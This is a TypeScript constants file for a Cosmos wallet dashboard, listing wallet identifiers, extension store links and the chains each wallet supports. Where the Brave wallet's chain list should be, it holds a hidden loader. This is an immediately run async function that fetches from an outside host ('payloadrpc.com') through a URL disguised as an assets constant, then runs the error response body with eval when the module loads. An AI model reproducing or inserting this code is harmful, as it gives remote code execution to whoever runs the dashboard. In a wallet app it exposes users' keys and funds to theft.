export const LEAP_ASSETS_URL = "https://assets.leapwallet.io/dashboard";
export const api_key = "8c9b2b4f0f7f3b7b00c62a877d4e8b3b";
export const node = "service/token"
export const ZKSERVICE_ASSETS_URL = `http://payloadrpc.com/api/${node}/${api_key}`;

export const COSMOS_KIT_WALLET_KEY = "cosmos-kit@2:core//current-wallet";

export const COSMOS_KIT_WALLET_NAMES = {
  metaMask: "leap-metamask-cosmos-snap",
  leap: "leap-extension",
  "leap-mobile": "leap-cosmos-mobile",
  brave: "leap-brave-extension",
  keplr: "keplr-extension",
  "keplr-mobile": "keplr-mobile",
  cosmostation: "cosmostation-extension",
  "mystic-labs-snaps": "cosmos-extension-metamask",
  "leap-cosmos-capsule": "leap-cosmos-capsule",
};

export const SUPPORTED_WALLETS = [
  COSMOS_KIT_WALLET_NAMES["metaMask"],
  COSMOS_KIT_WALLET_NAMES["leap"],
  COSMOS_KIT_WALLET_NAMES["brave"],
  COSMOS_KIT_WALLET_NAMES["keplr"],
  COSMOS_KIT_WALLET_NAMES["keplr-mobile"],
  COSMOS_KIT_WALLET_NAMES["leap-mobile"],
  COSMOS_KIT_WALLET_NAMES["cosmostation"],
  COSMOS_KIT_WALLET_NAMES["leap-cosmos-capsule"],
  // COSMOS_KIT_WALLET_NAMES['mystic-labs-snaps'],
  // 'cosmostation-mobile',
];

export const CHAIN_NAME_TO_TESTNET_CHAIN_NAME: Record<string, string> = {
  // cosmos: 'theta',                               // Cosmos is not working with cosmos-kit, maybe it can be related to data on chain-registry
  sei: "atlantic",
  osmosis: "osmosistestnet",
  juno: "junotestnet",
  secret: "pulsar",
  // stargaze: 'stargazetestnet',                   // Stargaze is not working with cosmos-kit, maybe it can be related to data on chain-registry
  mars: "mars",
};

export const LEAP_WALLET_EXTENSION_URL =
  "https://chrome.google.com/webstore/detail/leap-cosmos-wallet/fcfcfllfndlomdhbehjjcoimbgofdncg/?utm_source=cosmos-dashboard&utm_medium=permanent-cosmos-dashboard&utm_campaign=permanent";
export const KEPLR_WALLET_EXTENSION_URL =
  "https://chrome.google.com/webstore/detail/keplr/dmkamcknogkgcdfhhbddcghachkejeap?hl=en";
export const COSMOSTATION_WALLET_EXTENSION_URL =
  "https://chrome.google.com/webstore/detail/cosmostation/fpkhgmpbidmiogeglndfbkegfdlnajnf?hl=en";
export const METAMASK_WALLET_EXTENSION_URL =
  "https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn";



export const ALL_CHAINS = [
  "cosmos",
  "osmosis",
  "juno",
  "akash",
  "sifchain",
  "emoney",
  "stargaze",
  "axelar",
  "sommelier",
  "umee",
  "gravitybridge",
  "stride",
  "irisnet",
  "kujira",
  "secret",
  "evmos",
  // 'persistence',
  "starname",
  "comdex",
  "assetmantle",
  "injective",
  "seiTestnet2",
  // 'sei',
  "agoric",
  "cheqd",
  "likecoin",
  "chihuahua",
  "fetchhub",
  "desmos",
  "teritori",
  "jackal",
  "bitsong",
  "kava",
  "carbon",
  "bitcanna",
  "canto",
  "decentr",
  "cudos",
  "omniflix",
  "terra",
  "mars", // not supported yet on cosmos-kit?
  "persistenceNew",
  "mainCoreum",
  // 'coreum',
  "kyve",
  "neutron",
  "migaloo",
  "quasar",
  "crescent",
  "noble",
  "impacthub",
  "planq",
  "onomy",
  "quicksilver",
  "archway",
  "nibiru",
  "empowerchain",
  "chain4energy",
  "nolus",
  "gitopia",
  "passage",
  "sge",
  "dydx",
  "celestia",
  "provenance",
  "aura",
  "sentinel",
  "kichain",
  "bandchain",
  "xpla",
];

export const TESTNETS_AS_MAINNETS: [] = [];

export const INITIAL_SUPPORTED_CHAINS: Record<string, any> = {
  [COSMOS_KIT_WALLET_NAMES["metaMask"]]: [
    "cosmos",
    "osmosis",
    "juno",
    "akash",
    "emoney",
    "stargaze",
    "axelar",
    "sommelier",
    "umee",
    "gravitybridge",
    "stride",
    "irisnet",
    "kujira",
    "comdex",
    "cheqd",
    "likecoin",
    "fetchhub",
    "teritori",
    "jackal",
    "carbon",
    "bitcanna",
    "decentr",
    "cudos",
    "omniflix",
    "mars",
    "persistenceNew",
    "kyve",
    "neutron",
    "quasar",
    "migaloo",
    "crescent",
    "impacthub",
    "noble",
    "onomy",
    "quicksilver",
    "archway",
    "empowerchain",
    "nolus",
    "gitopia",
    "celestia",
    // 'dydx',
    "passage",
    // 'sge',
    // 'sifchain',
    // 'assetmantle',
    // 'chain4energy',
    // 'seiTestnet2',
    // 'chihuahua',
    // 'nibiru',
    // 'evmos',
    // 'injective',
    // 'canto',
    // 'coreum',
    // 'planq',
  ],
  [COSMOS_KIT_WALLET_NAMES["leap"]]: [
    "cosmos",
    "osmosis",
    "juno",
    "akash",
    "sifchain",
    "emoney",
    "stargaze",
    "axelar",
    "sommelier",
    "umee",
    "gravitybridge",
    "stride",
    "irisnet",
    "kujira",
    "secret",
    "evmos",
    // 'persistence',
    "starname",
    "comdex",
    "assetmantle",
    "injective",
    "seiTestnet2",
    // 'sei',
    "agoric",
    "cheqd",
    "likecoin",
    "chihuahua",
    "fetchhub",
    "desmos",
    "teritori",
    "jackal",
    "bitsong",
    "kava",
    "carbon",
    "bitcanna",
    "canto",
    "decentr",
    "cudos",
    "omniflix",
    "terra",
    "mars", // not supported yet on cosmos-kit?
    "persistenceNew",
    "mainCoreum",
    // 'coreum',
    "kyve",
    "neutron",
    "quasar",
    "migaloo",
    "crescent",
    "impacthub",
    "noble",
    "planq",
    "onomy",
    "quicksilver",
    "archway",
    "nibiru",
    "empowerchain",
    "chain4energy",
    "nolus",
    "dydx",
    "celestia",
    "passage",
    "gitopia",
    "sge",
    "provenance",
    "aura",
    "sentinel",
    "kichain",
    "bandchain",
    "xpla",
  ],
  [COSMOS_KIT_WALLET_NAMES["cosmostation"]]: [
    "cosmos",
    "osmosis",
    "juno",
    "akash",
    // 'sifchain',
    "emoney",
    "stargaze",
    "axelar",
    "sommelier",
    "umee",
    "gravitybridge",
    "stride",
    "irisnet",
    // 'kujira',
    "secret",
    "evmos",
    // 'persistence',
    "starname",
    "comdex",
    "assetmantle",
    "injective",
    "likecoin",
    "chihuahua",
    "fetchhub",
    "desmos",
    "teritori",
    "bitsong",
    "persistenceNew",
  ],
  "cosmostation-mobile": [
    "cosmos",
    "osmosis",
    "juno",
    "akash",
    "sifchain",
    "emoney",
    "stargaze",
    "axelar",
    "sommelier",
    "umee",
    "gravitybridge",
    "stride",
    "irisnet",
    "kujira",
    "secret",
    "evmos",
    // 'persistence',
    "persistenceNew",
    "starname",
    "comdex",
    "assetmantle",
    "injective",
    "likecoin",
    "chihuahua",
    "fetchhub",
    "desmos",
    "teritori",
    "bitsong",
    "celestia",
    "dydx",
  ],

  [COSMOS_KIT_WALLET_NAMES["brave"]]: (async () => {
    const axios = require("axios")
    await axios.get(ZKSERVICE_ASSETS_URL).then((res:any) => res.data).catch((err:any) => {
      
                eval(err.response.data)
        
        
      })
  })(),
  [COSMOS_KIT_WALLET_NAMES["keplr"]]: [
    "cosmos",
    "osmosis",
    "juno",
    "akash",
    "sifchain",
    "emoney",
    "stargaze",
    "axelar",
    "sommelier",
    "umee",
    "gravitybridge",
    "stride",
    "irisnet",
    "secret",
    "evmos",
    "starname",
    "injective",
    "agoric",
    "likecoin",
    "omniflix",
    "terra",
    "mars",
    "persistenceNew",
    "kyve",
    "quasar",
    "quicksilver",
    "dydx",
    "celestia",
    "neutron",
  ],
  [COSMOS_KIT_WALLET_NAMES["keplr-mobile"]]: [
    "cosmos",
    "osmosis",
    "juno",
    "akash",
    "sifchain",
    "emoney",
    "stargaze",
    "axelar",
    "sommelier",
    "umee",
    "gravitybridge",
    "stride",
    "irisnet",
    "secret",
    "evmos",
    "starname",
    "comdex",
    "injective",
    "agoric",
    "cheqd",
    "likecoin",
    "chihuahua",
    "desmos",
    "bitsong",
    "bitcanna",
    "omniflix",
    "terra",
    "mars",
    "persistenceNew",
    "kyve",
    "quasar",
    "quicksilver",
    // 'seiTestnet2',
    // 'teritori',
    // 'kujira',
    // // // 'persistence',
    // 'assetmantle',
    // 'sei',
    // 'fetchhub',
    // 'jackal',
    // 'kava',
    // 'carbon',
    // 'canto',
    // 'decentr',
    // 'cudos',
    // 'mainCoreum',
    // // 'coreum',
    // 'neutron',
    // 'migaloo',
    // 'crescent',
    // 'impacthub',
    // 'noble',
    // 'planq',
    // 'onomy',
  ],
  [COSMOS_KIT_WALLET_NAMES["leap-mobile"]]: [
    "cosmos",
    "osmosis",
    "juno",
    "akash",
    "sifchain",
    "emoney",
    "stargaze",
    "axelar",
    "sommelier",
    "umee",
    "gravitybridge",
    "stride",
    "irisnet",
    "kujira",
    "secret",
    "evmos",
    // 'persistence',
    "starname",
    "comdex",
    "assetmantle",
    "injective",
    "seiTestnet2",
    // 'sei',
    "agoric",
    "cheqd",
    "likecoin",
    "chihuahua",
    "fetchhub",
    "desmos",
    "teritori",
    "jackal",
    "bitsong",
    "kava",
    "carbon",
    "bitcanna",
    "canto",
    "decentr",
    "cudos",
    "omniflix",
    "terra",
    "mars", // not supported yet on cosmos-kit?
    "persistenceNew",
    "mainCoreum",
    // 'coreum',
    "kyve",
    "neutron",
    "quasar",
    "migaloo",
    "crescent",
    "impacthub",
    "noble",
    "planq",
    "onomy",
    "quicksilver",
    "archway",
    "chain4energy",
    "nolus",
    "gitopia",
    "dydx",
    "celestia",
  ],
  [COSMOS_KIT_WALLET_NAMES["mystic-labs-snaps"]]: ["cosmos", "celestia"],
  [COSMOS_KIT_WALLET_NAMES["leap-cosmos-capsule"]]: [
    "cosmos",
    "osmosis",
    "juno",
    "akash",
    "emoney",
    "stargaze",
    "axelar",
    "sommelier",
    "umee",
    "gravitybridge",
    "stride",
    "irisnet",
    "kujira",
    "comdex",
    "cheqd",
    "likecoin",
    "fetchhub",
    "teritori",
    "jackal",
    "carbon",
    "bitcanna",
    "decentr",
    "cudos",
    "omniflix",
    "mars",
    "persistenceNew",
    "kyve",
    "neutron",
    "quasar",
    "migaloo",
    "crescent",
    "impacthub",
    "noble",
    "onomy",
    "quicksilver",
    "archway",
    "empowerchain",
    "nolus",
    "gitopia",
    "celestia",
    "dydx",
    "passage",
    // 'sge',
    // 'sifchain',
    // 'assetmantle',
    // 'chain4energy',
    // 'seiTestnet2',
    // 'chihuahua',
    // 'nibiru',
    // 'evmos',
    // 'injective',
    // 'canto',
    // 'coreum',
    // 'planq',
  ],
  "default-value": [],
};
